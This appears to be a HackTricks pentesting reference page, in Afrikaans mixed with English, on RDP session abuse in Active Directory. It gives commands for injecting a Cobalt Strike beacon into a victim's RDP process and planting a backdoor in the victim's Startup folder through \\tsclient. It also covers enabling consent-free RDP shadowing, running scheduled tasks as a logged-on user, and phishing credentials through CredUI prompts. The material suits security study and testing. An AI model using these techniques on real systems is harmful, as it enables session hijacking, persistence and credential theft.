# RDP Sessie Misbruik

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

As die **eksterne groep** **RDP toegang** het tot enige **rekenaar** in die huidige domein, kan 'n **aanvaller** **daardie rekenaar kompromitteer en vir hom wag**.

Sodra daardie gebruiker via RDP toegang verkry het, kan die **aanvaller pivot na daardie gebruiker se sessie** en sy regte in die eksterne domein misbruik.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Kyk na **ander maniere om sessies met ander gereedskap te steel** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

As 'n gebruiker via **RDP into a machine** toegang kry waar 'n **attacker** vir hom **waiting** is, sal die attacker in staat wees om **inject a beacon in the RDP session of the user**, en as die **victim mounted his drive** toe hy via RDP toegang gekry het, kan die **attacker could access it**.

In hierdie geval kan jy net **compromise** die **victims** **original computer** deur 'n **backdoor** in die **statup folder** te skryf.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

As jy 'n **local admin** op 'n host is waar die slagoffer reeds 'n **active RDP session** het, kan jy moontlik **view/control that desktop without stealing the password or dumping LSASS**.

Dit hang af van die **Remote Desktop Services shadowing** beleid wat gestoor is in:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Interessante waardes:

- `0`: Gedeaktiveer
- `1`: `EnableInputNotify` (beheer, gebruikersgoedkeuring benodig)
- `2`: `EnableInputNoNotify` (beheer, **geen gebruikersgoedkeuring**)
- `3`: `EnableNoInputNotify` (slegs-kyk, gebruikersgoedkeuring benodig)
- `4`: `EnableNoInputNoNotify` (slegs-kyk, **geen gebruikersgoedkeuring**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Dit is veral nuttig wanneer 'n bevoorregte gebruiker wat oor RDP verbind is, 'n ontgrendelde lessenaar, KeePass-sessie, MMC-konsol, blaaier-sessie of admin shell oopgelaat het.

## Geskeduleerde take as aangemelde gebruiker

As jy 'n **local admin** is en die teikengebruiker **tans aangemeld** is, kan Task Scheduler kode begin **as daardie gebruiker sonder hul wagwoord**.

Dit verander die slagoffer se bestaande aanmeldessie in 'n uitvoeringsprimitief:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Aantekeninge:

- As die gebruiker **nie aangemeld is nie**, vereis Windows gewoonlik die wagwoord om 'n taak te skep wat as hulle loop.
- As die gebruiker **aangemeld is**, kan die taak die bestaande aanmeldkonteks hergebruik.
- Dit is 'n praktiese manier om GUI-aksies uit te voer of binaries binne die slagoffer se sessie te begin sonder om LSASS aan te raak.

## CredUI Prompt-misbruik vanaf die slagoffer se sessie

Sodra jy kan uitvoer **binne die slagoffer se interaktiewe lessenaar** (byvoorbeeld via **Shadow RDP** of **'n scheduled task running as that user**), kan jy 'n **egte Windows-aanmeldprompt** vertoon met CredUI APIs en die deur die slagoffer ingevoerde kredensies oes.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipiese vloei:

1. Start 'n binary in die slagoffer se sessie.
2. Vertoon 'n domein-aouthentiseringsprompt wat by die huidige domein-branding pas.
3. Pak die teruggegewe auth buffer uit.
4. Valideer die gegewe kredensies en hou opsioneel aan om te vra totdat geldige kredensies ingevoer is.

Dit is nuttig vir **on-host phishing** omdat die prompt deur standaard Windows APIs gerender word in plaas van 'n valse HTML-vorm.

## Requesting a PFX In the Victim Context

Die selfde **scheduled-task-as-user** primitive kan gebruik word om 'n **certificate/PFX as the logged-on victim** aan te vra. Daardie sertifikaat kan later gebruik word vir **AD authentication** as daardie gebruiker, wat wagwoorddiefstal heeltemal vermy.

Hoëvlak-vloei:

1. Kry **local admin** op 'n host waar die slagoffer aangemeld is.
2. Voer enrollment/export logika as die slagoffer uit deur 'n **scheduled task** te gebruik.
3. Eksporteer die resulterende **PFX**.
4. Gebruik die PFX vir PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
